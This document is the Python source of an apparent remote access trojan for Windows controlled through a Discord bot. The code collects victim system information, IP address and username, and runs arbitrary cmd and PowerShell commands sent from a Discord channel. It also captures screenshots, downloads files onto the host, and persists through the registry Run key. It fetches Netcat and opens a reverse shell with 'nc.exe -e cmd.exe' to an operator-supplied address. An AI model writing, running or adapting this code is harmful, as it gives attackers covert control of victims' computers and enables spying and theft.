from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
from discord.utils import get
import subprocess
import time

## solve codec error.
import codecs
codecs.register_error("strict", codecs.ignore_errors)

import os, subprocess, requests, winreg
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime

guild_id = "1232211549519872000"
session_id = os.urandom(8).hex()

DISCORD_TOKEN = ""

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

def get_processor():
    stdout = subprocess.Popen(["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True).stdout.read().decode()
    return stdout.split("\n")[3]


def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False, start_new_session=True)
    return output

def get_nc():
    download = requests.get("https://dl.packetstormsecurity.net/groups/checksum/nc.exe")
    with open(f"{TEMP}\\nc.exe", "wb") as f:
        f.write(download.content)
    return "Netcat downloaded to temp folder"


intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
bot = Bot("!", intents=intents)

commands = "\n".join([
    "help - Help command",
    "cd - Change directory",
    "ls - List directory",
    "upload <link> - Upload file",
    "cmd - Execute cmd.exe command",
    "shell - Execute powershell.exe command",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "persist <name> - Persistence Backdoor",
    "getNC - Download Netcat",
    
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "screenshot":
        screenshot = ImageGrab.grab(all_screens=True)
        path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)
    
    if message.content.startswith("cd"):
        directory = message.content[3:]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        if len(files) > 4093:
            open(f"{TEMP}\\list.txt", "w").write(files)
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\list.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content[7:]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content[6:]
        output = subprocess.Popen(
            ["powershell.exe", command], start_new_session=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8-sig")
        if output == "":
            output = "No output"
        if output:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cmd"):
        command = message.content[4:]
        await message.channel.send("```"+Exec(command).decode("utf-8-sig")+"```")

    if message.content.startswith("persist"):
        name = message.content[8:]
        if not name:
            embed = discord.Embed(title="Error", description="```No name provided```", color=0xfafafa)
            await message.reply(embed=embed)
        else:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, os.path.realpath(__file__))
            winreg.CloseKey(registry_key)
            embed = discord.Embed(title="Startup", description=f"```Added to startup as {name}```", color=0xfafafa)
            await message.reply(embed=embed)
    
    if message.content.startswith("getNC"):
        await message.channel.send("```"+get_nc()+"```")

    if message.content.startswith("useNC"):
        ip, port = message.content[6:].split(" ")
        subprocess.Popen([f"{TEMP}\\nc.exe", "-e", "cmd.exe", ip, port], start_new_session=True)
        await message.channel.send("```Netcat started```")

if __name__ == "__main__":

    bot.run(DISCORD_TOKEN)